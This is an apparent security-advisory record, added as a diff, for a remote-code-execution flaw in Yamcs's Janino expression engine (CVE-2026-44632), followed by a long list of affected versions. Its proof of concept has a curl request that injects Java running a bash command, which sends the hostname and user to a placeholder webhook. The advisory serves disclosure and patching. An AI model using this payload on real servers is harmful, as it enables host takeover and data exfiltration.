@@ -1,0 +1,238 @@
+advisory_id: GHSA-524g-x36v-9wm6
+datasource_id: github_osv/GHSA-524g-x36v-9wm6
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-524g-x36v-9wm6/GHSA-524g-x36v-9wm6.json
+aliases:
+  - CVE-2026-44632
+summary: |
+  Yamcs Vulnerable to Server-Side Code Injection (RCE) via Janino Expression Engine in `JavaExprAlgorithmExecutionFactory`
+  ### Summary
+  A Server-Side Code Injection vulnerability exists in the Yamcs algorithm evaluation engine (`org.yamcs.algorithms.JavaExprAlgorithmExecutionFactory`). The application dynamically compiles and evaluates user-controlled algorithm text without enforcing a secure sandbox. An authenticated user with the `ChangeMissionDatabase` privilege can exploit this to achieve Remote Code Execution (RCE) on the underlying host operating system via the Janino compiler.
+
+  ### Proof of Concept (PoC)
+  The vulnerability can be exploited by overriding an existing algorithm's text via the REST API and injecting a malicious Java payload that executes OS commands.
+
+  **Prerequisites:**
+  1. A running Yamcs instance with an active processor (e.g., `instance=myproject`, `processor=realtime`).
+  2. An active authentication token for a user with the `SystemPrivilege.ChangeMissionDatabase` privilege.
+
+  **Steps to Reproduce:**
+
+  1. Send an authenticated HTTP `PATCH` request to the MDB override endpoint to inject the malicious Java code into an existing algorithm (e.g., `copySunsensor`). The payload uses `java.lang.Runtime` to execute a reverse shell or ping an external webhook.
+
+  ```bash
+  curl -i -X PATCH \
+    'http://<YAMCS-SERVER-IP>:8090/api/mdb/myproject/realtime/algorithms/myproject/copySunsensor' \
+    -H 'Content-Type: application/json' \
+    -H 'Authorization: Bearer <YOUR_AUTH_TOKEN>' \
+    -d '{
+      "action": "SET",
+      "algorithm": {
+        "text": "try { java.lang.Runtime.getRuntime().exec(new String[]{\"bash\", \"-c\", \"curl https://<YOUR-WEBHOOK-URL>/$(hostname)_$(whoami)\"}); } catch (Exception e) {} out0.setFloatValue(1.0f);"
+      }
+    }'
+  ```
+
+  2. Trigger the algorithm evaluation by sending telemetry data that the algorithm depends on (e.g., running the `simulator.py` script to generate sun sensor data).
+  3. The Yamcs server uses the Janino `SimpleCompiler` to compile the injected text into a Java class on the fly. Since no restrictive `ClassLoader` is applied, the payload is successfully compiled and executed.
+  4. Verify that the command executed successfully on the host machine by checking the incoming HTTP request on the provided webhook URL.
+
+  ### Impact
+  This vulnerability allows a user with application-level configuration privileges to escalate their access to full System/OS control. This leads to arbitrary command execution, potential data exfiltration, and lateral movement within the network hosting the Yamcs server.
+
+  ### Credits
+  Discovered & reported by Pablo Picurelli Ortiz (@superpegaso2703), cybersecurity student at Universidad Rey Juan Carlos.
+impacted_packages:
+  - purl: pkg:maven/org.yamcs/yamcs-core
+    affected_versions: vers:maven/<5.12.7
+    fixed_versions: vers:maven/5.12.7
+    affected_packages:
+      - pkg:maven/org.yamcs/yamcs-core@0.29.3
+      - pkg:maven/org.yamcs/yamcs-core@0.30.0
+      - pkg:maven/org.yamcs/yamcs-core@3.0.0
+      - pkg:maven/org.yamcs/yamcs-core@3.1.0
+      - pkg:maven/org.yamcs/yamcs-core@3.1.1
+      - pkg:maven/org.yamcs/yamcs-core@3.1.2
+      - pkg:maven/org.yamcs/yamcs-core@3.2.0
+      - pkg:maven/org.yamcs/yamcs-core@3.2.1
+      - pkg:maven/org.yamcs/yamcs-core@3.2.2
+      - pkg:maven/org.yamcs/yamcs-core@3.3.0
+      - pkg:maven/org.yamcs/yamcs-core@3.3.1
+      - pkg:maven/org.yamcs/yamcs-core@3.4.0
+      - pkg:maven/org.yamcs/yamcs-core@3.4.1
+      - pkg:maven/org.yamcs/yamcs-core@3.4.2
+      - pkg:maven/org.yamcs/yamcs-core@3.4.3
+      - pkg:maven/org.yamcs/yamcs-core@3.4.4
+      - pkg:maven/org.yamcs/yamcs-core@3.4.5
+      - pkg:maven/org.yamcs/yamcs-core@3.4.6
+      - pkg:maven/org.yamcs/yamcs-core@3.4.8
+      - pkg:maven/org.yamcs/yamcs-core@3.4.11
+      - pkg:maven/org.yamcs/yamcs-core@4.0.0
+      - pkg:maven/org.yamcs/yamcs-core@4.0.1
+      - pkg:maven/org.yamcs/yamcs-core@4.1.1
+      - pkg:maven/org.yamcs/yamcs-core@4.1.2
+      - pkg:maven/org.yamcs/yamcs-core@4.2.0
+      - pkg:maven/org.yamcs/yamcs-core@4.2.1
+      - pkg:maven/org.yamcs/yamcs-core@4.2.2
+      - pkg:maven/org.yamcs/yamcs-core@4.3.0
+      - pkg:maven/org.yamcs/yamcs-core@4.3.1
+      - pkg:maven/org.yamcs/yamcs-core@4.4.0
+      - pkg:maven/org.yamcs/yamcs-core@4.4.1
+      - pkg:maven/org.yamcs/yamcs-core@4.4.2
+      - pkg:maven/org.yamcs/yamcs-core@4.5.0
+      - pkg:maven/org.yamcs/yamcs-core@4.6.0
+      - pkg:maven/org.yamcs/yamcs-core@4.6.1
+      - pkg:maven/org.yamcs/yamcs-core@4.6.2
+      - pkg:maven/org.yamcs/yamcs-core@4.6.3
+      - pkg:maven/org.yamcs/yamcs-core@4.7
+      - pkg:maven/org.yamcs/yamcs-core@4.7.1
+      - pkg:maven/org.yamcs/yamcs-core@4.7.3
+      - pkg:maven/org.yamcs/yamcs-core@4.8.0
+      - pkg:maven/org.yamcs/yamcs-core@4.8.1
+      - pkg:maven/org.yamcs/yamcs-core@4.9.0
+      - pkg:maven/org.yamcs/yamcs-core@4.9.1
+      - pkg:maven/org.yamcs/yamcs-core@4.9.2
+      - pkg:maven/org.yamcs/yamcs-core@4.9.3
+      - pkg:maven/org.yamcs/yamcs-core@4.9.4
+      - pkg:maven/org.yamcs/yamcs-core@4.10.0
+      - pkg:maven/org.yamcs/yamcs-core@4.10.1
+      - pkg:maven/org.yamcs/yamcs-core@4.10.2
+      - pkg:maven/org.yamcs/yamcs-core@4.10.3
+      - pkg:maven/org.yamcs/yamcs-core@4.10.4
+      - pkg:maven/org.yamcs/yamcs-core@4.10.5
+      - pkg:maven/org.yamcs/yamcs-core@4.10.6
+      - pkg:maven/org.yamcs/yamcs-core@4.10.7
+      - pkg:maven/org.yamcs/yamcs-core@4.10.8
+      - pkg:maven/org.yamcs/yamcs-core@4.10.9
+      - pkg:maven/org.yamcs/yamcs-core@5.0.0
+      - pkg:maven/org.yamcs/yamcs-core@5.1.0
+      - pkg:maven/org.yamcs/yamcs-core@5.1.1
+      - pkg:maven/org.yamcs/yamcs-core@5.1.2
+      - pkg:maven/org.yamcs/yamcs-core@5.1.3
+      - pkg:maven/org.yamcs/yamcs-core@5.1.4
+      - pkg:maven/org.yamcs/yamcs-core@5.2.0
+      - pkg:maven/org.yamcs/yamcs-core@5.2.1
+      - pkg:maven/org.yamcs/yamcs-core@5.2.2
+      - pkg:maven/org.yamcs/yamcs-core@5.2.3
+      - pkg:maven/org.yamcs/yamcs-core@5.2.4
+      - pkg:maven/org.yamcs/yamcs-core@5.2.5
+      - pkg:maven/org.yamcs/yamcs-core@5.2.6
+      - pkg:maven/org.yamcs/yamcs-core@5.3.0
+      - pkg:maven/org.yamcs/yamcs-core@5.3.1
+      - pkg:maven/org.yamcs/yamcs-core@5.3.2
+      - pkg:maven/org.yamcs/yamcs-core@5.3.3
+      - pkg:maven/org.yamcs/yamcs-core@5.3.4
+      - pkg:maven/org.yamcs/yamcs-core@5.3.5
+      - pkg:maven/org.yamcs/yamcs-core@5.3.6
+      - pkg:maven/org.yamcs/yamcs-core@5.4.0
+      - pkg:maven/org.yamcs/yamcs-core@5.4.1
+      - pkg:maven/org.yamcs/yamcs-core@5.4.2
+      - pkg:maven/org.yamcs/yamcs-core@5.4.3
+      - pkg:maven/org.yamcs/yamcs-core@5.4.4
+      - pkg:maven/org.yamcs/yamcs-core@5.4.5
+      - pkg:maven/org.yamcs/yamcs-core@5.5.0
+      - pkg:maven/org.yamcs/yamcs-core@5.5.1
+      - pkg:maven/org.yamcs/yamcs-core@5.5.2
+      - pkg:maven/org.yamcs/yamcs-core@5.5.3
+      - pkg:maven/org.yamcs/yamcs-core@5.5.4
+      - pkg:maven/org.yamcs/yamcs-core@5.5.5
+      - pkg:maven/org.yamcs/yamcs-core@5.5.6
+      - pkg:maven/org.yamcs/yamcs-core@5.5.7
+      - pkg:maven/org.yamcs/yamcs-core@5.6.0
+      - pkg:maven/org.yamcs/yamcs-core@5.6.1
+      - pkg:maven/org.yamcs/yamcs-core@5.6.2
+      - pkg:maven/org.yamcs/yamcs-core@5.7.0
+      - pkg:maven/org.yamcs/yamcs-core@5.7.1
+      - pkg:maven/org.yamcs/yamcs-core@5.7.2
+      - pkg:maven/org.yamcs/yamcs-core@5.7.3
+      - pkg:maven/org.yamcs/yamcs-core@5.7.4
+      - pkg:maven/org.yamcs/yamcs-core@5.7.5
+      - pkg:maven/org.yamcs/yamcs-core@5.7.6
+      - pkg:maven/org.yamcs/yamcs-core@5.7.7
+      - pkg:maven/org.yamcs/yamcs-core@5.7.8
+      - pkg:maven/org.yamcs/yamcs-core@5.7.9
+      - pkg:maven/org.yamcs/yamcs-core@5.7.10
+      - pkg:maven/org.yamcs/yamcs-core@5.7.11
+      - pkg:maven/org.yamcs/yamcs-core@5.7.12
+      - pkg:maven/org.yamcs/yamcs-core@5.7.13
+      - pkg:maven/org.yamcs/yamcs-core@5.8.0
+      - pkg:maven/org.yamcs/yamcs-core@5.8.1
+      - pkg:maven/org.yamcs/yamcs-core@5.8.2
+      - pkg:maven/org.yamcs/yamcs-core@5.8.3
+      - pkg:maven/org.yamcs/yamcs-core@5.8.4
+      - pkg:maven/org.yamcs/yamcs-core@5.8.5
+      - pkg:maven/org.yamcs/yamcs-core@5.8.6
+      - pkg:maven/org.yamcs/yamcs-core@5.8.7
+      - pkg:maven/org.yamcs/yamcs-core@5.8.8
+      - pkg:maven/org.yamcs/yamcs-core@5.9.0
+      - pkg:maven/org.yamcs/yamcs-core@5.9.1
+      - pkg:maven/org.yamcs/yamcs-core@5.9.2
+      - pkg:maven/org.yamcs/yamcs-core@5.9.3
+      - pkg:maven/org.yamcs/yamcs-core@5.9.4
+      - pkg:maven/org.yamcs/yamcs-core@5.9.5
+      - pkg:maven/org.yamcs/yamcs-core@5.9.6
+      - pkg:maven/org.yamcs/yamcs-core@5.9.7
+      - pkg:maven/org.yamcs/yamcs-core@5.9.8
+      - pkg:maven/org.yamcs/yamcs-core@5.9.8.1
+      - pkg:maven/org.yamcs/yamcs-core@5.9.9
+      - pkg:maven/org.yamcs/yamcs-core@5.9.10
+      - pkg:maven/org.yamcs/yamcs-core@5.9.11
+      - pkg:maven/org.yamcs/yamcs-core@5.9.12
+      - pkg:maven/org.yamcs/yamcs-core@5.10.0
+      - pkg:maven/org.yamcs/yamcs-core@5.10.1
+      - pkg:maven/org.yamcs/yamcs-core@5.10.2
+      - pkg:maven/org.yamcs/yamcs-core@5.10.3
+      - pkg:maven/org.yamcs/yamcs-core@5.10.4
+      - pkg:maven/org.yamcs/yamcs-core@5.10.5
+      - pkg:maven/org.yamcs/yamcs-core@5.10.6
+      - pkg:maven/org.yamcs/yamcs-core@5.10.7
+      - pkg:maven/org.yamcs/yamcs-core@5.10.8
+      - pkg:maven/org.yamcs/yamcs-core@5.10.9
+      - pkg:maven/org.yamcs/yamcs-core@5.10.10
+      - pkg:maven/org.yamcs/yamcs-core@5.10.11
+      - pkg:maven/org.yamcs/yamcs-core@5.10.12
+      - pkg:maven/org.yamcs/yamcs-core@5.11.0
+      - pkg:maven/org.yamcs/yamcs-core@5.11.1
+      - pkg:maven/org.yamcs/yamcs-core@5.11.2
+      - pkg:maven/org.yamcs/yamcs-core@5.11.3
+      - pkg:maven/org.yamcs/yamcs-core@5.11.4
+      - pkg:maven/org.yamcs/yamcs-core@5.11.5
+      - pkg:maven/org.yamcs/yamcs-core@5.11.6
+      - pkg:maven/org.yamcs/yamcs-core@5.11.7
+      - pkg:maven/org.yamcs/yamcs-core@5.11.8
+      - pkg:maven/org.yamcs/yamcs-core@5.11.9
+      - pkg:maven/org.yamcs/yamcs-core@5.11.10
+      - pkg:maven/org.yamcs/yamcs-core@5.11.11
+      - pkg:maven/org.yamcs/yamcs-core@5.11.12
+      - pkg:maven/org.yamcs/yamcs-core@5.11.13
+      - pkg:maven/org.yamcs/yamcs-core@5.12.0
+      - pkg:maven/org.yamcs/yamcs-core@5.12.1
+      - pkg:maven/org.yamcs/yamcs-core@5.12.2
+      - pkg:maven/org.yamcs/yamcs-core@5.12.3
+      - pkg:maven/org.yamcs/yamcs-core@5.12.4
+      - pkg:maven/org.yamcs/yamcs-core@5.12.5
+      - pkg:maven/org.yamcs/yamcs-core@5.12.6
+    fixed_packages:
+      - pkg:maven/org.yamcs/yamcs-core@5.12.7
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '9.1'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-524g-x36v-9wm6/GHSA-524g-x36v-9wm6.json
+  - score: CRITICAL
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-94
+references:
+  - url: https://github.com/yamcs/yamcs
+    reference_type:
+    reference_id:
+  - url: https://github.com/yamcs/yamcs/security/advisories/GHSA-524g-x36v-9wm6
+    reference_type:
+    reference_id:
+exploits: []
